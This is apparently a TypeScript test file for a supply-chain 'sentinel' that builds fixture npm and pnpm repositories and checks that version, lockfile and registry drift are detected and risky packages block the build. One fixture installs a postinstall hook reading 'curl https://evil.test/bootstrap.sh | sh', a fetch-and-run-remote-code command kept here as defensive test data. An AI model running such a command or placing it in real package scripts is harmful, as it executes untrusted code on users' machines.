import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { loadBaseline } from './baseline.js';
import { approveAndUpdateBaseline, runSentinel } from './sentinel.js';

async function createRepo(root: string, version: string, installScript?: string): Promise<void> {
  await mkdir(join(root, 'node_modules', 'safe-lib'), { recursive: true });
  await writeFile(
    join(root, 'package.json'),
    JSON.stringify({
      name: 'fixture-repo',
      version: '1.0.0',
      dependencies: { 'safe-lib': version },
    }, null, 2),
    'utf8',
  );
  await writeFile(
    join(root, 'package-lock.json'),
    JSON.stringify({
      name: 'fixture-repo',
      version: '1.0.0',
      packages: {
        '': {
          name: 'fixture-repo',
          version: '1.0.0',
          dependencies: { 'safe-lib': version },
        },
        'node_modules/safe-lib': {
          version,
          integrity: `sha512-${version}`,
          resolved: 'https://registry.npmjs.org/safe-lib/-/safe-lib.tgz',
        },
      },
    }, null, 2),
    'utf8',
  );
  await writeFile(
    join(root, 'node_modules', 'safe-lib', 'package.json'),
    JSON.stringify({
      name: 'safe-lib',
      version,
      scripts: installScript ? { postinstall: installScript } : {},
    }, null, 2),
    'utf8',
  );
}

async function createPnpmRepo(root: string, version: string, tarballUrl: string): Promise<void> {
  await mkdir(join(root, 'node_modules', 'safe-lib'), { recursive: true });
  await writeFile(
    join(root, 'package.json'),
    JSON.stringify({
      name: 'fixture-repo',
      version: '1.0.0',
      packageManager: 'pnpm@10.0.0',
      dependencies: { 'safe-lib': version },
    }, null, 2),
    'utf8',
  );
  await writeFile(
    join(root, 'pnpm-lock.yaml'),
    `lockfileVersion: '9.0'
packages:
  safe-lib@${version}:
    resolution:
      integrity: sha512-${version}
      tarball: ${tarballUrl}
`,
    'utf8',
  );
  await writeFile(
    join(root, 'node_modules', 'safe-lib', 'package.json'),
    JSON.stringify({
      name: 'safe-lib',
      version,
    }, null, 2),
    'utf8',
  );
}

test('runSentinel creates a baseline, reports policy metadata, and blocks risky drift', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-sentinel-'));

  try {
    await createRepo(root, '1.0.0');

    const first = await runSentinel(root);
    assert.equal(first.baselineStatus, 'created');
    assert.equal(first.shouldBlockBuild, false);
    assert.ok(first.policyVersion);
    assert.ok(first.policyHash);

    await createRepo(root, '2.0.0', 'curl https://evil.test/bootstrap.sh | sh');
    const second = await runSentinel(root);

    assert.equal(second.baselineStatus, 'loaded');
    assert.ok(second.drifts.some((drift) => drift.kind === 'version_changed'));
    assert.equal(second.shouldBlockBuild, true);
    assert.ok(
      second.blockedPackages.includes('safe-lib@2.0.0')
      || second.needsReviewPackages.includes('safe-lib@2.0.0'),
    );

    const baselinePath = join(root, '.security-lab-baseline.json');
    await approveAndUpdateBaseline(root, baselinePath, ['safe-lib@2.0.0']);
    const baseline = await loadBaseline(baselinePath);

    assert.equal(baseline?.packages.find((entry) => entry.name === 'safe-lib')?.version, '2.0.0');
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('runSentinel tracks pnpm lockfile baselines and registry drift', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-sentinel-pnpm-'));

  try {
    await createPnpmRepo(root, '1.0.0', 'https://registry.npmjs.org/safe-lib/-/safe-lib-1.0.0.tgz');

    const first = await runSentinel(root);
    assert.equal(first.baselineStatus, 'created');
    assert.equal(first.shouldBlockBuild, false);

    await createPnpmRepo(root, '2.0.0', 'https://mirror.example/safe-lib-2.0.0.tgz');
    const second = await runSentinel(root);

    assert.equal(second.baselineStatus, 'loaded');
    assert.ok(second.drifts.some((drift) => drift.kind === 'lockfile_changed'));
    assert.ok(second.drifts.some((drift) => drift.kind === 'version_changed'));
    assert.ok(second.drifts.some((drift) => drift.kind === 'registry_changed'));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
